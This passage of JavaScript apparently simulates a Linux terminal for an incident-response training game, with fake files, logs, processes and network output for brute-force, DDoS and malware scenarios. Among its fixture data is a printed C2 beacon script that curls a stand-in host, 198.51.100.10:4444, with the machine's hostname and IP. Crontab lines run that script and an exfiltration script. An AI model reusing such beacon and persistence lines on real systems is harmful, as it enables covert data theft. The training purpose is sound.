// ─── Simulated Filesystem ────────────────────────────────────────────────────
const HOSTNAME = 'soc-lab-01';
const DATE = () => new Date().toLocaleString('en-US', { month: 'short', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false }).replace(',', '');

const FILESYSTEM = {
  '/': ['etc', 'var', 'home', 'usr', 'tmp', 'proc', 'opt', 'root', 'srv'],
  '/etc': ['passwd', 'shadow', 'hosts', 'hostname', 'resolv.conf', 'nginx', 'ssh', 'iptables', 'fail2ban', 'crontab', 'os-release'],
  '/etc/nginx': ['nginx.conf', 'sites-available', 'sites-enabled'],
  '/etc/ssh': ['sshd_config', 'ssh_config', 'known_hosts'],
  '/etc/fail2ban': ['jail.conf', 'jail.d', 'filter.d'],
  '/var': ['log', 'www', 'lib', 'run', 'spool'],
  '/var/log': ['auth.log', 'syslog', 'kern.log', 'nginx', 'fail2ban.log', 'dpkg.log', 'ufw.log'],
  '/var/log/nginx': ['access.log', 'error.log'],
  '/var/www': ['html', 'app'],
  '/home': ['analyst', 'deploy'],
  '/home/analyst': ['.bash_history', '.bashrc', 'investigations', 'notes.txt'],
  '/home/analyst/investigations': ['incident-2024-05-21.txt', 'pcap-analysis.txt', 'threat-intel.md'],
  '/tmp': ['.hidden', 'systemd-private', 'tmpfiles'],
  '/tmp/.hidden': ['svchost32', 'beacon.sh', 'exfil.py'],
  '/opt': ['monitoring', 'security', 'backup'],
  '/root': ['.bash_history', '.ssh', 'incident-response', 'scripts'],
  '/root/incident-response': ['ddos-runbook.sh', 'malware-scan.sh', 'forensics.sh'],
};

const FILE_CONTENTS = {
  '/etc/hostname': () => HOSTNAME,
  '/etc/os-release': () => `NAME="Ubuntu"\nVERSION="22.04.3 LTS (Jammy Jellyfish)"\nID=ubuntu\nPRETTY_NAME="Ubuntu 22.04.3 LTS"\nVERSION_ID="22.04"\nHOME_URL="https://www.ubuntu.com/"`,
  '/etc/hosts': () => `127.0.0.1\tlocalhost\n127.0.1.1\t${HOSTNAME}\n10.0.0.1\tfw-main firewall\n10.0.0.254\trouter-core\n192.168.1.11\tweb-server-1\n192.168.1.12\tweb-server-2\n192.168.2.11\tdb-server-1\n172.16.1.1\tweb-proxy`,
  '/etc/resolv.conf': () => `nameserver 8.8.8.8\nnameserver 1.1.1.1\nsearch corp.local`,
  '/etc/passwd': () => `root:x:0:0:root:/root:/bin/bash\ndeamon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nnginx:x:101:101::/var/cache/nginx:/sbin/nologin\npostgres:x:102:102:PostgreSQL:/var/lib/postgresql:/bin/bash\ndeploy:x:1001:1001:Deploy User,,,:/home/deploy:/bin/bash\nanalyst:x:1002:1002:SOC Analyst,,,:/home/analyst:/bin/bash`,
  '/etc/crontab': (state) => state.malware
    ? `# /etc/crontab: system-wide crontab\nSHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n# m h dom mon dow user  command\n17 * * * * root cd / && run-parts --report /etc/cron.hourly\n25 6 * * * root test -x /usr/sbin/anacron\n@reboot root /tmp/.hidden/beacon.sh &  # <-- SUSPICIOUS\n*/5 * * * * root /tmp/.hidden/exfil.py 198.51.100.10 4444 # <-- C2 BEACON`
    : `# /etc/crontab: system-wide crontab\nSHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n# m h dom mon dow user  command\n17 * * * * root cd / && run-parts --report /etc/cron.hourly\n25 6 * * * root test -x /usr/sbin/anacron`,
  '/etc/nginx/nginx.conf': () => `user www-data;\nworker_processes auto;\nerror_log /var/log/nginx/error.log warn;\npid /var/run/nginx.pid;\nevents { worker_connections 1024; }\nhttp {\n  include /etc/nginx/mime.types;\n  default_type application/octet-stream;\n  sendfile on;\n  keepalive_timeout 65;\n  include /etc/nginx/sites-enabled/*;\n}`,
  '/etc/ssh/sshd_config': () => `Port 22\nAddressFamily any\nListenAddress 0.0.0.0\nPermitRootLogin yes\nPubkeyAuthentication yes\nPasswordAuthentication yes\nMaxAuthTries 6\nLoginGraceTime 60\nUsePAM yes\nPrintLastLog yes`,
  '/var/log/nginx/access.log': (state) => generateNginxAccessLog(state),
  '/var/log/nginx/error.log': (state) => generateNginxErrorLog(state),
  '/var/log/fail2ban.log': (state) => generateFail2banLog(state),
  '/var/log/ufw.log': (state) => generateUfwLog(state),
  '/home/analyst/notes.txt': () => `=== SOC ANALYST NOTES ===\nDate: ${new Date().toLocaleDateString()}\n\nActive Investigations:\n- [HIGH] SSH brute force from 185.220.101.47 - ongoing\n- [MEDIUM] Unusual outbound traffic on port 4444\n- [LOW] Failed login attempts on mail server\n\nUseful commands:\n  journalctl -u ssh -n 50     # SSH logs\n  netstat -an | grep ESTABLISHED  # Active connections\n  iptables -A INPUT -s <IP> -j DROP  # Block IP\n  fail2ban-client status sshd  # Fail2ban status\n\nNote: All actions logged to /var/log/audit.log`,
  '/home/analyst/investigations/incident-2024-05-21.txt': () => `INCIDENT REPORT - 2024-05-21\n============================\nType: SSH Brute Force + Potential Compromise\nSource IP: 185.220.101.47 (TOR exit node - known malicious)\nTarget: web-server-1 (192.168.1.11)\nFirst Detected: 14:20:03 UTC\nStatus: ACTIVE\n\nTimeline:\n14:20:03 - First failed SSH attempt detected\n14:20:04 - Rate: ~200 attempts/min\n14:23:45 - 500+ failed attempts\n14:28:31 - WARNING: Possible successful auth (investigate!)\n14:35:00 - Suspicious process spawned: svchost32.exe\n\nAction Required:\n1. Verify if authentication succeeded\n2. Block source IP immediately\n3. Check for unauthorized processes\n4. Review /tmp for dropped files\n5. Consider isolating web-server-1`,
  '/tmp/.hidden/beacon.sh': () => `#!/bin/bash\n# C2 beacon script\nwhile true; do\n  curl -s http://198.51.100.10:4444/beacon?host=$(hostname)&ip=$(hostname -I) > /dev/null 2>&1\n  sleep 300\ndone`,
  '/root/incident-response/ddos-runbook.sh': () => `#!/bin/bash\n# DDoS Mitigation Runbook\necho "[*] Starting DDoS mitigation..."\n\n# Step 1: Identify top source IPs\nnetstat -ntu | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -rn | head -20\n\n# Step 2: Apply rate limiting\niptables -A INPUT -p tcp --dport 80 -m limit --limit 25/minute --limit-burst 100 -j ACCEPT\niptables -A INPUT -p tcp --dport 80 -j DROP\n\n# Step 3: Block top offenders\n# Usage: ./ddos-runbook.sh block <IP>\necho "[+] Rate limiting applied"`,
};

// ─── Dynamic Log Generators ───────────────────────────────────────────────────
function generateAuthLog(state, lines = 40) {
  const attackerIP = '185.220.101.47';
  const legitimateIP = '10.0.0.254';
  const log = [];
  const now = new Date();
  for (let i = lines; i >= 0; i--) {
    const t = new Date(now - i * 12000);
    const ts = t.toLocaleString('en-US', { month: 'short', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false }).replace(',', '').replace(/\//g, ' ');
    const users = ['root', 'admin', 'ubuntu', 'deploy', 'user', 'pi', 'test', 'oracle', 'postgres'];
    const user = users[Math.floor(Math.random() * users.length)];
    const port = 40000 + Math.floor(Math.random() * 20000);
    if (state?.bruteforce || Math.random() < 0.85) {
      log.push(`${ts} web-server-1 sshd[4829]: Failed password for ${user} from ${attackerIP} port ${port} ssh2`);
    }
    if (Math.random() < 0.05) {
      log.push(`${ts} web-server-1 sshd[4829]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=${attackerIP} user=${user}`);
    }
  }
  if (state?.bruteforce) {
    const successTs = new Date(now - 30000).toLocaleString('en-US', { month: 'short', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false }).replace(',', '');
    log.push(`${successTs} web-server-1 sshd[4830]: Accepted password for deploy from ${attackerIP} port 51234 ssh2`);
    log.push(`${new Date(now - 25000).toLocaleString('en-US', { month: 'short', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false }).replace(',', '')} web-server-1 sshd[4830]: pam_unix(sshd:session): session opened for user deploy by (uid=0)`);
  }
  return log.join('\n');
}

function generateSyslog(state) {
  const lines = [];
  const now = new Date();
  for (let i = 20; i >= 0; i--) {
    const t = new Date(now - i * 3000);
    const ts = t.toLocaleString('en-US', { month: 'short', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false }).replace(',', '');
    lines.push(`${ts} ${HOSTNAME} systemd[1]: Started Session ${100 + i} of user root.`);
    if (state?.ddos) lines.push(`${ts} ${HOSTNAME} kernel: [${(123456 + i).toString()}.789] nf_conntrack: table full, dropping packet`);
    if (state?.malware) lines.push(`${ts} ${HOSTNAME} kernel: [${(123456 + i).toString()}.123] audit: type=1400 audit(${Date.now() / 1000 | 0}.${i}:${i}): apparmor="ALLOWED" operation="exec" profile="unconfined" name="/tmp/.hidden/svchost32"`);
  }
  return lines.join('\n');
}

function generateKernLog(state) {
  const lines = [];
  const now = new Date();
  for (let i = 15; i >= 0; i--) {
    const t = new Date(now - i * 2000);
    const ts = t.toLocaleString('en-US', { month: 'short', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false }).replace(',', '');
    if (state?.ddos) {
      lines.push(`${ts} ${HOSTNAME} kernel: [${(12345 + i * 2).toString()}.678901] net_ratelimit: ${Math.floor(Math.random() * 50) + 10} callbacks suppressed`);
      lines.push(`${ts} ${HOSTNAME} kernel: [${(12345 + i * 2 + 1).toString()}.001234] TCP: possible SYN flooding on port 80. Sending cookies. Check SNMP counters.`);
    } else {
      lines.push(`${ts} ${HOSTNAME} kernel: [${(12345 + i * 2).toString()}.001] INFO: task migration/${i}:${i} blocked for more than 120 seconds.`);
    }
  }
  return lines.join('\n');
}

function generateNginxAccessLog(state) {
  const lines = [];
  const now = new Date();
  const attackerIP = '185.220.101.47';
  const normalIPs = ['10.0.0.100', '10.0.0.101', '172.16.0.50', '192.168.1.200'];
  for (let i = 30; i >= 0; i--) {
    const t = new Date(now - i * (state?.ddos ? 200 : 2000));
    const ts = `${t.toLocaleDateString('en-GB', { day: '2-digit', month: 'short', year: 'numeric' }).replace(/ /g, '/')}:${t.toTimeString().slice(0, 8)} +0000`;
    const paths = ['/', '/index.html', '/api/status', '/login', '/admin', '/wp-login.php', '/.env'];
    const path = state?.ddos ? '/' : paths[Math.floor(Math.random() * paths.length)];
    const ip = state?.ddos ? attackerIP : normalIPs[Math.floor(Math.random() * normalIPs.length)];
    const status = state?.ddos ? '503' : Math.random() < 0.9 ? '200' : '404';
    const bytes = Math.floor(Math.random() * 50000) + 512;
    lines.push(`${ip} - - [${ts}] "GET ${path} HTTP/1.1" ${status} ${bytes} "-" "Mozilla/5.0"`);
  }
  return lines.join('\n');
}

function generateNginxErrorLog(state) {
  if (!state?.ddos) return '# No errors recorded';
  const now = new Date();
  const lines = [];
  for (let i = 10; i >= 0; i--) {
    const t = new Date(now - i * 500);
    const ts = t.toLocaleString('en-US', { month: 'short', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false }).replace(',', '');
    lines.push(`${ts} [crit] 1234#0: *${i * 100} connect() to 127.0.0.1:8080 failed (111: Connection refused) while connecting to upstream`);
    lines.push(`${ts} [error] 1234#0: accept4() failed (24: Too many open files)`);
  }
  return lines.join('\n');
}

function generateFail2banLog(state) {
  const lines = [];
  const now = new Date();
  const attackerIP = '185.220.101.47';
  for (let i = 8; i >= 0; i--) {
    const t = new Date(now - i * 60000);
    const ts = t.toISOString().replace('T', ' ').slice(0, 23);
    if (i % 3 === 0) lines.push(`${ts},000 fail2ban.filter [1234]: INFO    [sshd] Found ${attackerIP} - ${ts}`);
    if (i === 5) lines.push(`${ts},001 fail2ban.actions [1234]: NOTICE  [sshd] Ban ${attackerIP}`);
    if (i === 2) lines.push(`${ts},002 fail2ban.actions [1234]: NOTICE  [sshd] Unban ${attackerIP}`);
  }
  return lines.join('\n');
}

function generateUfwLog(state) {
  const lines = [];
  const now = new Date();
  for (let i = 10; i >= 0; i--) {
    const t = new Date(now - i * 5000);
    const ts = t.toISOString().replace('T', ' ').slice(0, 23);
    const srcIP = state?.blockedIPs?.length > 0 ? state.blockedIPs[0] : '185.220.101.47';
    lines.push(`${ts} ${HOSTNAME} kernel: [UFW BLOCK] IN=eth0 OUT= MAC=... SRC=${srcIP} DST=192.168.1.11 LEN=44 TOS=0x00 PREC=0x00 TTL=64 ID=${Math.floor(Math.random() * 60000)} DF PROTO=TCP SPT=${40000 + i * 100} DPT=22 WINDOW=1024 RES=0x00 SYN URGP=0`);
  }
  return lines.join('\n');
}

// ─── Process Table ─────────────────────────────────────────────────────────────
function generateProcessList(state) {
  const processes = [
    { user: 'root', pid: 1, ppid: 0, cpu: 0.0, mem: 0.1, vsz: 168464, rss: 11616, tty: '?', stat: 'Ss', start: '09:00', time: '0:06', cmd: '/sbin/init splash' },
    { user: 'root', pid: 2, ppid: 0, cpu: 0.0, mem: 0.0, vsz: 0, rss: 0, tty: '?', stat: 'S', start: '09:00', time: '0:00', cmd: '[kthreadd]' },
    { user: 'root', pid: 892, ppid: 1, cpu: 0.0, mem: 0.1, vsz: 15832, rss: 7216, tty: '?', stat: 'Ss', start: '09:01', time: '0:00', cmd: '/usr/sbin/sshd -D' },
    { user: 'root', pid: 1200, ppid: 1, cpu: 0.2, mem: 0.4, vsz: 75440, rss: 34816, tty: '?', stat: 'Ss', start: '09:01', time: '0:12', cmd: '/lib/systemd/systemd-journald' },
    { user: 'www-data', pid: 1234, ppid: 1, cpu: 2.1, mem: 4.5, vsz: 498032, rss: 367424, tty: '?', stat: 'S', start: '09:01', time: '0:45', cmd: 'nginx: worker process' },
    { user: 'www-data', pid: 1235, ppid: 1, cpu: 1.8, mem: 4.2, vsz: 498032, rss: 364512, tty: '?', stat: 'S', start: '09:01', time: '0:41', cmd: 'nginx: worker process' },
    { user: 'postgres', pid: 1456, ppid: 1, cpu: 5.3, mem: 6.3, vsz: 512048, rss: 514432, tty: '?', stat: 'Ss', start: '09:01', time: '1:23', cmd: '/usr/lib/postgresql/14/bin/postgres -D /var/lib/postgresql/14/main' },
    { user: 'root', pid: 2001, ppid: 1, cpu: 1.2, mem: 1.8, vsz: 1578032, rss: 147456, tty: '?', stat: 'Ssl', start: '09:01', time: '0:22', cmd: '/usr/bin/dockerd -H fd://' },
    { user: 'root', pid: 3100, ppid: 1, cpu: 3.4, mem: 2.2, vsz: 892048, rss: 180224, tty: '?', stat: 'Ssl', start: '09:01', time: '0:34', cmd: '/usr/bin/prometheus --config.file=/etc/prometheus/prometheus.yml' },
    { user: 'root', pid: 4500, ppid: 1, cpu: 8.2, mem: 3.1, vsz: 456032, rss: 253952, tty: '?', stat: 'Sl', start: '09:02', time: '1:02', cmd: '/usr/bin/suricata -c /etc/suricata/suricata.yaml -i eth0' },
    { user: 'root', pid: 5678, ppid: 1, cpu: 0.1, mem: 0.3, vsz: 29832, rss: 24576, tty: '?', stat: 'Ss', start: '09:02', time: '0:01', cmd: '/usr/sbin/fail2ban-server -xf start' },
    { user: 'analyst', pid: 6000, ppid: 5999, cpu: 0.0, mem: 0.2, vsz: 24832, rss: 16384, tty: 'pts/0', stat: 'S+', start: '14:00', time: '0:00', cmd: '/bin/bash' },
  ];
  if (state?.malware) {
    processes.push({ user: 'root', pid: 4829, ppid: 1, cpu: 95.2, mem: 8.3, vsz: 5120000, rss: 681984, tty: '?', stat: 'R', start: '14:20', time: '8:23', cmd: '/tmp/.hidden/svchost32 -k hidden -c2 198.51.100.10:4444' });
    processes.push({ user: 'root', pid: 4830, ppid: 4829, cpu: 12.4, mem: 2.1, vsz: 102400, rss: 172032, tty: '?', stat: 'S', start: '14:21', time: '1:45', cmd: 'bash /tmp/.hidden/beacon.sh' });
  }
  return processes;
}

function psAux(state) {
  const procs = generateProcessList(state);
  const header = 'USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND';
  const rows = procs.map(p =>
    `${p.user.padEnd(12)} ${String(p.pid).padEnd(5)} ${p.cpu.toFixed(1).padStart(4)} ${p.mem.toFixed(1).padStart(4)} ${String(p.vsz).padStart(7)} ${String(p.rss).padStart(6)} ${(p.tty || '?').padEnd(8)} ${(p.stat || 'S').padEnd(4)} ${p.start.padEnd(7)} ${p.time.padStart(6)} ${p.cmd}`
  );
  return [header, ...rows];
}

// ─── Network State ─────────────────────────────────────────────────────────────
function generateNetstat(state) {
  const conns = [
    'Active Internet connections (w/o servers)',
    'Proto Recv-Q Send-Q Local Address           Foreign Address         State',
    'tcp        0      0 192.168.1.11:80         10.0.0.100:52341        ESTABLISHED',
    'tcp        0      0 192.168.1.11:443        172.16.0.50:48291       ESTABLISHED',
    'tcp        0      0 192.168.1.11:5432       192.168.1.12:45123      ESTABLISHED',
    'tcp6       0      0 :::22                   :::*                    LISTEN',
    'tcp6       0      0 :::80                   :::*                    LISTEN',
    'tcp6       0      0 :::443                  :::*                    LISTEN',
    'udp        0      0 0.0.0.0:53              0.0.0.0:*',
  ];
  if (state?.bruteforce) {
    for (let i = 0; i < 12; i++) {
      conns.push(`tcp        0      0 192.168.1.11:22         185.220.101.47:${40000 + i * 100}        SYN_RECV`);
    }
  }
  if (state?.ddos) {
    conns.push('tcp        0      0 192.168.1.11:80         *:*                     LISTEN');
    for (let i = 0; i < 20; i++) {
      conns.push(`tcp     ${(Math.random() * 65535 | 0).toString().padStart(6)}      0 192.168.1.11:80         185.220.101.${47 + i}:${50000 + i}        SYN_RECV`);
    }
  }
  if (state?.malware) {
    conns.push(`tcp        0      0 192.168.1.11:${Math.floor(Math.random() * 10000) + 50000}         198.51.100.10:4444      ESTABLISHED`);
  }
  return conns;
}

function generateSS(state) {
  const lines = [
    'Netid  State   Recv-Q Send-Q   Local Address:Port    Peer Address:Port   Process',
    'tcp    LISTEN  0      128            0.0.0.0:22           0.0.0.0:*       users:("sshd",pid=892)',
    'tcp    LISTEN  0      511            0.0.0.0:80           0.0.0.0:*       users:("nginx",pid=1234)',
    'tcp    LISTEN  0      511            0.0.0.0:443          0.0.0.0:*       users:("nginx",pid=1234)',
    'tcp    LISTEN  0      128            0.0.0.0:5432         0.0.0.0:*       users:("postgres",pid=1456)',
    'tcp    ESTAB   0      0     192.168.1.11:443    10.0.0.100:52341',
    'udp    UNCONN  0      0              0.0.0.0:53           0.0.0.0:*       users:("systemd-resolve",pid=600)',
  ];
  if (state?.malware) {
    lines.push('tcp    ESTAB   0      0     192.168.1.11:53421  198.51.100.10:4444  users:("svchost32",pid=4829)  <<< SUSPICIOUS');
  }
  return lines;
}

function generateIfconfig() {
  return [
    'eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500',
    '        inet 192.168.1.11  netmask 255.255.255.0  broadcast 192.168.1.255',
    '        inet6 fe80::a00:27ff:fe4e:66a1  prefixlen 64  scopeid 0x20<link>',
    '        ether 08:00:27:4e:66:a1  txqueuelen 1000  (Ethernet)',
    '        RX packets 2847392  bytes 3145728000 (3.1 GB)',
    '        TX packets 1923847  bytes 1887436800 (1.8 GB)',
    '',
    'lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536',
    '        inet 127.0.0.1  netmask 255.0.0.0',
    '        inet6 ::1  prefixlen 128  scopeid 0x10<host>',
    '        RX packets 12847  bytes 1024000 (1.0 MB)',
    '        TX packets 12847  bytes 1024000 (1.0 MB)',
  ];
}

// ─── Firewall Rules ─────────────────────────────────────────────────────────────
function generateIptables(state) {
  const rules = [
    'Chain INPUT (policy ACCEPT)',
    'target     prot opt source               destination',
    'ACCEPT     all  --  anywhere             anywhere             state RELATED,ESTABLISHED',
    'DROP       all  --  anywhere             anywhere             state INVALID',
    'ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:ssh',
    'ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:http',
    'ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:https',
  ];
  if (state?.blockedIPs) {
    state.blockedIPs.forEach(ip => {
      rules.push(`DROP       all  --  ${ip}           anywhere`);
    });
  }
  if (state?.rateLimit) {
    rules.push('DROP       tcp  --  anywhere             anywhere             tcp dpt:http limit: avg 25/min burst 100');
  }
  rules.push('', 'Chain FORWARD (policy DROP)', 'target     prot opt source               destination', '', 'Chain OUTPUT (policy ACCEPT)', 'target     prot opt source               destination');
  return rules;
}

function generateUfwStatus(state) {
  const lines = ['Status: active', '', 'To                         Action      From', '--                         ------      ----', '22/tcp                     ALLOW       Anywhere', '80/tcp                     ALLOW       Anywhere', '443/tcp                    ALLOW       Anywhere'];
  if (state?.blockedIPs) {
    state.blockedIPs.forEach(ip => {
      lines.push(`Anywhere                   DENY        ${ip}`);
    });
  }
  return lines;
}

// ─── Docker Output ────────────────────────────────────────────────────────────
function generateDockerPs() {
  return [
    'CONTAINER ID   IMAGE              COMMAND                  CREATED       STATUS         PORTS                               NAMES',
    'a1b2c3d4e5f6   nginx:1.24         "/docker-entrypoint.…"   5 days ago    Up 5 days      0.0.0.0:80->80/tcp, :::80->80/tcp   nginx-proxy',
    'b2c3d4e5f6a1   postgres:14        "docker-entrypoint.s…"   5 days ago    Up 5 days      5432/tcp                             postgres-db',
    'c3d4e5f6a1b2   redis:7.0          "docker-entrypoint.s…"   5 days ago    Up 5 days      6379/tcp                             redis-cache',
    'e5f6a1b2c3d4   prom/prometheus    "/bin/prometheus --c…"   5 days ago    Up 5 days      0.0.0.0:9090->9090/tcp              monitoring',
    'f6a1b2c3d4e5   grafana/grafana    "/run.sh"                5 days ago    Up 5 days      0.0.0.0:3000->3000/tcp              grafana',
  ];
}

// ─── Main Command Executor ─────────────────────────────────────────────────────
export function executeCommand(rawInput, state = {}) {
  const parts = rawInput.trim().split(/\s+/);
  const cmd = parts[0]?.toLowerCase();
  const args = parts.slice(1);
  const fullCmd = rawInput.trim();
  const result = { output: [], error: false, sideEffects: [], raw: false };

  const ipBlockPattern = /(?:iptables.*-[jA].*DROP.*-s|iptables.*-s.*-j\s+DROP|ufw\s+deny\s+(?:from\s+)?|fail2ban-client\s+set\s+\w+\s+banip\s+)(\d{1,3}(?:\.\d{1,3}){3})/i;
  const ipMatch = rawInput.match(ipBlockPattern);

  switch (cmd) {
    case 'ls': {
      const path = args.find(a => !a.startsWith('-')) || state.cwd || '/home/analyst';
      const showAll = args.includes('-a') || args.includes('-la') || args.includes('-al');
      const showLong = args.includes('-l') || args.includes('-la') || args.includes('-al');
      const normPath = path.startsWith('/') ? path : `${state.cwd}/${path}`;
      const children = FILESYSTEM[normPath] || FILESYSTEM[state.cwd] || FILESYSTEM['/home/analyst'] || [];
      if (showLong) {
        result.output = [`total ${children.length * 4 + 8}`, 'drwxr-xr-x  2 root root 4096 May 21 14:00 .', 'drwxr-xr-x 18 root root 4096 May 21 09:00 ..'];
        children.forEach(f => {
          const isDir = FILESYSTEM[`${normPath}/${f}`] || f === '.' || f === '..';
          const perm = isDir ? 'drwxr-xr-x' : '-rw-r--r--';
          const user = f.includes('shadow') ? 'root shadow' : 'root root';
          result.output.push(`${perm}  1 ${user} ${Math.floor(Math.random() * 8000) + 512} May 21 09:${String(Math.floor(Math.random() * 60)).padStart(2, '0')} ${f}`);
        });
      } else {
        result.output = children.length > 0 ? [children.join('  ')] : ['(empty)'];
      }
      break;
    }
    case 'cd': {
      const target = args[0] || '/home/analyst';
      const newPath = target === '..' ? state.cwd?.split('/').slice(0, -1).join('/') || '/' : target.startsWith('/') ? target : `${state.cwd}/${target}`;
      result.sideEffects.push({ type: 'cwd', value: newPath });
      result.output = [];
      break;
    }
    case 'pwd':
      result.output = [state.cwd || '/home/analyst'];
      break;
    case 'whoami':
      result.output = ['root'];
      break;
    case 'id':
      result.output = ['uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),133(sambashare)'];
      break;
    case 'uname':
      result.output = args.includes('-a')
        ? [`Linux ${HOSTNAME} 5.15.0-91-generic #101-Ubuntu SMP Tue Nov 14 13:30:08 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux`]
        : ['Linux'];
      break;
    case 'hostname':
      result.output = [HOSTNAME];
      break;
    case 'uptime': {
      const h = Math.floor(Math.random() * 10) + 2;
      result.output = [` ${DATE()}  up  ${h}:${String(Math.floor(Math.random() * 60)).padStart(2, '0')},  2 users,  load average: ${(Math.random() + 1).toFixed(2)}, ${(Math.random() * 0.8 + 0.5).toFixed(2)}, ${(Math.random() * 0.5 + 0.3).toFixed(2)}`];
      break;
    }
    case 'date':
      result.output = [new Date().toString()];
      break;
    case 'w':
      result.output = [` ${DATE()}  up  2:34,  2 users,  load average: 1.42, 1.18, 0.97`, 'USER     TTY      FROM             LOGIN@   IDLE JCPU   PCPU WHAT', 'root     pts/0    10.0.0.254       14:00    0.00s  0.00s  0.00s bash', 'analyst  pts/1    10.0.0.100       14:05    5.00s  0.00s  0.00s w'];
      break;
    case 'cat': {
      const filePath = args[0] || '';
      const fullPath = filePath.startsWith('/') ? filePath : `${state.cwd}/${filePath}`;
      const gen = FILE_CONTENTS[fullPath] || FILE_CONTENTS[filePath];
      if (gen) {
        const content = typeof gen === 'function' ? gen(state) : gen;
        result.output = content.split('\n');
        if (filePath.includes('auth.log') || filePath.includes('auth')) {
          result.output = generateAuthLog(state).split('\n');
        }
        if (filePath.includes('syslog')) result.output = generateSyslog(state).split('\n');
        if (filePath.includes('kern.log')) result.output = generateKernLog(state).split('\n');
      } else {
        result.output = [`cat: ${filePath}: No such file or directory`];
        result.error = true;
      }
      break;
    }
    case 'grep': {
      const pattern = args[0] || '';
      const file = args[args.length - 1] || '';
      const isRecursive = args.includes('-r') || args.includes('-ri') || args.includes('-rl');
      if (pattern.toLowerCase().includes('failed') && (file.includes('auth') || file.includes('log'))) {
        const attackerIP = '185.220.101.47';
        result.output = Array.from({ length: 8 }, (_, i) =>
          `auth.log:May 21 14:${20 + i}:${String(Math.floor(Math.random() * 60)).padStart(2, '0')} web-server-1 sshd[4829]: Failed password for root from ${attackerIP} port ${42000 + i * 100} ssh2`
        );
        result.sideEffects.push({ type: 'mission_command', cmd: 'grep_auth_log' });
      } else if (pattern.toLowerCase().includes('185.220') || pattern.toLowerCase().includes('attacker')) {
        result.output = [`Attacker IP detected: 185.220.101.47 (TOR exit node)`, `Total occurrences in auth.log: ${Math.floor(Math.random() * 500) + 200}`];
        result.sideEffects.push({ type: 'mission_command', cmd: 'identify_attacker_ip' });
      } else if (pattern) {
        result.output = [`(no matches for "${pattern}" in ${file})`];
      }
      break;
    }
    case 'tail': {
      const n = args.includes('-f') ? 20 : parseInt(args.find(a => a.startsWith('-'))?.slice(1)) || 10;
      const file = args.find(a => !a.startsWith('-')) || '';
      if (file.includes('auth') || file.includes('syslog')) {
        result.output = generateAuthLog(state).split('\n').slice(-n);
        result.sideEffects.push({ type: 'mission_command', cmd: 'check_logs' });
      } else if (file.includes('nginx')) {
        result.output = generateNginxAccessLog(state).split('\n').slice(-n);
      } else if (file.includes('kern')) {
        result.output = generateKernLog(state).split('\n').slice(-n);
      } else {
        result.output = [`tail: cannot open '${file}' for reading: No such file or directory`];
        result.error = true;
      }
      break;
    }
    case 'head': {
      const n = parseInt(args.find(a => a.startsWith('-'))?.slice(1)) || 10;
      const file = args.find(a => !a.startsWith('-')) || '';
      if (file.includes('auth')) result.output = generateAuthLog(state).split('\n').slice(0, n);
      else result.output = [`head: ${file}: No such file or directory`];
      break;
    }
    case 'journalctl': {
      const unit = args[args.indexOf('-u') + 1] || args[args.indexOf('--unit') + 1];
      const lines = parseInt(args[args.indexOf('-n') + 1]) || 20;
      const follow = args.includes('-f');
      if (unit === 'ssh' || unit === 'sshd' || fullCmd.includes('ssh')) {
        result.output = generateAuthLog(state).split('\n').slice(-lines);
        result.sideEffects.push({ type: 'mission_command', cmd: 'check_ssh_logs' });
      } else if (unit === 'nginx') {
        result.output = generateNginxAccessLog(state).split('\n').slice(-lines);
      } else if (unit === 'fail2ban') {
        result.output = generateFail2banLog(state).split('\n').slice(-lines);
      } else {
        result.output = generateSyslog(state).split('\n').slice(-lines);
      }
      if (follow) result.output.push('-- Logs begin following... (Press Ctrl+C to stop) --');
      break;
    }
    case 'ps': {
      result.output = psAux(state);
      if (state?.malware) result.sideEffects.push({ type: 'mission_command', cmd: 'check_processes' });
      break;
    }
    case 'top':
      result.output = [
        `top - ${DATE()} up  2:34,  2 users,  load average: ${state?.ddos ? '9.82, 8.41, 7.23' : '1.42, 1.18, 0.97'}`,
        `Tasks: ${state?.malware ? '142 total,   2 running' : '139 total,   1 running'}, 138 sleeping,   0 stopped,   0 zombie`,
        `%Cpu(s): ${state?.ddos ? '92.3 us,  4.1 sy,  0.0 ni,  2.8 id,  0.8 wa' : '23.5 us,  5.2 sy,  0.0 ni, 68.8 id,  2.5 wa'}`,
        `MiB Mem :  16384.0 total,   2048.0 free,   8192.0 used,   6144.0 buff/cache`,
        `MiB Swap:   4096.0 total,   3840.0 free,    256.0 used.   7680.0 avail Mem`,
        '',
        '    PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND',
        ...(state?.malware ? [
          '   4829 root      20   0 5000000 665672  10240 R  95.2   8.3   8:23.01 svchost32  <<< CRITICAL',
        ] : []),
        '   4500 root      20   0  456032 247808  12288 S   8.2   3.1   1:02.34 suricata',
        '   3100 root      20   0  892048 176128  14336 S   3.4   2.2   0:34.12 prometheus',
        '   1456 postgres  20   0  512048 516096  18432 S   5.3   6.3   1:23.45 postgres',
        '   1234 www-data  20   0  498032 368640  22528 S   2.1   4.5   0:45.12 nginx',
        '    892 root      20   0   15832   7168   5120 S   0.0   0.1   0:00.12 sshd',
      ];
      break;
    case 'free':
